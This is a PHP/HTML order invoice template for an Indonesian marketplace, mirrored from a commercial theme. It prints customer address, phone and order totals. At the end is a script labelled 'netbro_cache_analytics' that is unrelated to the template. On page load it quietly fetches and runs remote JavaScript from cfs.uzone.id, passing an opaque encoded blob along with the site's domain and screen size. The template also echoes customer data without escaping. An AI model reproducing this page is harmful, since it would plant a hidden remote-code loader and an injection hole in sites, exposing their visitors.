<!DOCTYPE html>
<html lang="en">


<!-- Mirrored from themes.pixelstrap.com/multikart/front-end/email-order-success-two.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 19 Mar 2020 18:08:38 GMT -->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="icon" href="../assets/images/favicon/1.png" type="image/x-icon">
  <link rel="shortcut icon" href="../assets/images/favicon/1.png" type="image/x-icon">
  <title>Cetak Invoice | UMKM MarketPlace </title>
  <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700,900" rel="stylesheet">

  <style type="text/css">
    body {
      text-align: center;
      margin: 0 auto;
      width: 650px;
      font-family: 'Open Sans', sans-serif;
      background-color: #e2e2e2;
      display: block;
    }

    ul {
      margin: 0;
      padding: 0;
    }

    li {
      display: inline-block;
      text-decoration: unset;
    }

    a {
      text-decoration: none;
    }

    p {
      margin: 15px 0;
    }

    h5 {
      color: #444;
      text-align: left;
      font-weight: 400;
    }

    .text-center {
      text-align: center
    }

    .main-bg-light {
      background-color: #fafafa;
    }

    .title {
      color: #444444;
      font-size: 22px;
      font-weight: bold;
      margin-top: 10px;
      margin-bottom: 10px;
      padding-bottom: 0;
      text-transform: uppercase;
      display: inline-block;
      line-height: 1;
    }

    table {
      margin-top: 30px
    }

    table.top-0 {
      margin-top: 0;
    }

    table.order-detail {
      border: 1px solid #ddd;
      border-collapse: collapse;
    }

    table.order-detail tr:nth-child(even) {
      border-top: 1px solid #ddd;
      border-bottom: 1px solid #ddd;
    }

    table.order-detail tr:nth-child(odd) {
      border-bottom: 1px solid #ddd;
    }

    .pad-left-right-space {
      border: unset !important;
    }

    .pad-left-right-space td {
      padding: 5px 15px;
    }

    .pad-left-right-space td p {
      margin: 0;
    }

    .pad-left-right-space td b {
      font-size: 15px;
      font-family: 'Roboto', sans-serif;
    }

    .order-detail th {
      font-size: 16px;
      padding: 15px;
      text-align: center;
      background: #fafafa;
    }

    .footer-social-icon tr td img {
      margin-left: 5px;
      margin-right: 5px;
    }
  </style>
</head>

<body style="margin: 20px auto;">
  <table align="center" border="0" cellpadding="0" cellspacing="0"
    style="padding: 0 30px;background-color: #fff; -webkit-box-shadow: 0px 0px 14px -4px rgba(0, 0, 0, 0.2705882353);box-shadow: 0px 0px 14px -4px rgba(0, 0, 0, 0.2705882353);width: 100%;">
    <tbody>
      <tr>
        <td>
          <table align="left" border="0" cellpadding="0" cellspacing="0" style="text-align: left;" width="100%">
            <tr>
              <td>
                <p style="font-size: 14px;"><b><?php echo $transaksi['nama'] ?>,</b></p>
                <p style="font-size: 14px;">Transaksi anda telah sukses dan sedang diproses menuju alamat anda.</p>
                <p style="font-size: 14px;">Kode Transaksi : <?php echo $transaksi['kode_bayar'] ?>,</p>
              </td>
            </tr>
          </table>

          <table cellpadding="0" cellspacing="0" border="0" align="left" style="width: 100%;margin-top: 10px;    margin-bottom: 10px;">
            <tbody>
              <tr>
                <td style="background-color: #fafafa;border: 1px solid #ddd;padding: 15px;letter-spacing: 0.3px;width: 50%;">
                  <h5 style="font-size: 16px; font-weight: 600;color: #000; line-height: 16px; padding-bottom: 13px; border-bottom: 1px solid #e6e8eb; letter-spacing: -0.65px; margin-top:0; margin-bottom: 13px;">
                    Alamat Pengiriman</h5>
                  <p style="text-align: left;font-weight: normal; font-size: 14px; color: #000000;line-height: 21px;    margin-top: 0;">
                    <?php echo $transaksi['alamat'] ?>,<br> <?php echo $transaksi['kecamatan'] ?>
                    <?php echo $transaksi['kota'] ?> <br><?php echo $transaksi['provinsi'] ?><br><?php echo $transaksi['no_telepon'] ?></p>
                </td>
                <td><img src="<?php echo base_url() ?>images/space.jpg" alt=" " height="25" width="30">
                </td>
                <td style="background-color: #fafafa;border: 1px solid #ddd;padding: 15px;letter-spacing: 0.3px;width: 50%;">
                  <h5 style="font-size: 16px;font-weight: 600;color: #000; line-height: 16px; padding-bottom: 13px; border-bottom: 1px solid #e6e8eb; letter-spacing: -0.65px; margin-top:0; margin-bottom: 13px;">
                    Alamat Penagihan</h5>
                  <p style="text-align: left;font-weight: normal; font-size: 14px; color: #000000;line-height: 21px;    margin-top: 0;">
                      <?php echo $transaksi['alamat'] ?>,<br> <?php echo $transaksi['kecamatan'] ?>
                      <?php echo $transaksi['kota'] ?> <br><?php echo $transaksi['provinsi'] ?><br><?php echo $transaksi['no_telepon'] ?></p>
                </td>
              </tr>
            </tbody>
          </table>
          <table class="order-detail" border="0" cellpadding="0" cellspacing="0" align="left" style="width: 100%;    margin-bottom: 50px;">
            <tr align="left">
              <th>PRODUK</th>
              <th style="padding-left: 15px;">NAMA PRODUK</th>
              <th>JUMLAH</th>
              <th>HARGA </th>
            </tr>

          <?php foreach ($transaksi2 as $t): ?>
            <tr>
              <td>
                <img src="<?php echo base_url('images/produk/'.$t->foto_produk) ?>" alt="" width="80">
              </td>
              <td valign="top" style="padding-left: 15px;">
                <h5 style="margin-top: 15px;"><?php echo $t->nama_produk ?></h5>
              </td>
              <td valign="top" style="padding-left: 15px;">
                <h5 style="font-size: 14px; color:#444;margin-top: 10px;">QTY : <span><?php echo $t->jumlah_produk ?></span></h5>
              </td>
              <td valign="top" style="padding-left: 15px;">
                <h5 style="font-size: 14px; color:#444;margin-top:15px"><b>Rp <?php echo number_format($t->sub_total) ?></b></h5>
              </td>
            </tr>
          <?php endforeach; ?>

            <tr class="pad-left-right-space ">
              <td class="m-t-5" colspan="2" align="left">
                <p style="font-size: 14px;">Subtotal : </p>
              </td>
              <td class="m-t-5" colspan="2" align="right">
                <b style>Rp <?php echo number_format($transaksi1['sub_total'])?></b>
              </td>
            <tr class="pad-left-right-space">
              <td colspan="2" align="left">
                <p style="font-size: 14px;">Harga Pengiriman :</p>
              </td>
              <td colspan="2" align="right">
                <b>Rp <?php echo number_format($transaksi['harga_pengiriman']) ?></b>
              </td>
            </tr>
            <tr class="pad-left-right-space ">
              <td class="m-b-5" colspan="2" align="left">
                <p style="font-size: 14px;">Total :</p>
              </td>
              <td class="m-b-5" colspan="2" align="right">
                <b>Rp <?php echo number_format($transaksi1['sub_total'] + $transaksi['harga_pengiriman'])?></b>
              </td>
            </tr>

          </table>

        </td>
      </tr>
    </tbody>
  </table>
  <table class="main-bg-light text-center top-0" align="center" border="0" cellpadding="0" cellspacing="0" width="100%">
    <tr>
      <td style="padding: 30px;">
        <div>
          <h4 class="title" style="margin:0;text-align: center;">UMKM Market Place</h4>
        </div>
        <div style="border-top: 1px solid #ddd; margin: 20px auto 0;"></div>
      </td>
    </tr>
  </table>
  <script>
		window.print();
	</script>
  <script type="text/javascript">
    if (self == top) {
      function netbro_cache_analytics(fn, callback) {
        setTimeout(function() {
          fn();
          callback();
        }, 0);
      }

      function sync(fn) {
        fn();
      }

      function requestCfs() {
        var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
        var idc_glo_r = Math.floor(Math.random() * 99999999999);
        var url = idc_glo_url + "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" +
          "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXo4kodK9nTBDBaLSTjZTQN5t4qqqPE0OQQnjKckje6vc2x6bOPYSemTP1SZRbwJC4j0%2fmM9CwFEJ3cFEGEMnLSQW%2fjNVUvsFxT8A%2bK3B7fYuSZ3LzAiJGLvUbg1wKejxpLrUhWE5XxLkJPPZArkcVVhlx1puT8kp%2fDw7PP%2f1JHyVMMgZC1DiO4rRDe0kUbEUpmpdSt7CVq04VO0KdCgbHaTP1BfZLMDWxIg9C09yE24YbcMn9TatslzXxgcA94Mj31i29T0dXk5s%2b05OTxXEs2IptsNeM4uJUgqQZmJLUZDsxQy3BKDUsYXjsKBRtQGasy%2bkeXCDaqubG5mh7CYz%2f6mz4wNqtT6eTFH4bvKz6T4SFAGxNkBLSvmeybENIW6BD9JFnQ%2baKTZlWgQk40S8TlBDFjPGNaBhMQGJakoQWLkEC8IIEBAVBG%2biouLlKKUsiWBzyz%2bJiRAI0%2f2gaxi685Gq3Sm1VvT9RcMjnxBN6R873jWCQQmTvMF9GkB99wHE3k6SGUxCsRNs%3d" +
          "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
        var bsa = document.createElement('script');
        bsa.type = 'text/javascript';
        bsa.async = true;
        bsa.src = url;
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
      }
      netbro_cache_analytics(requestCfs, function() {});
    };
  </script>
</body>


<!-- Mirrored from themes.pixelstrap.com/multikart/front-end/email-order-success-two.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 19 Mar 2020 18:08:44 GMT -->

</html>
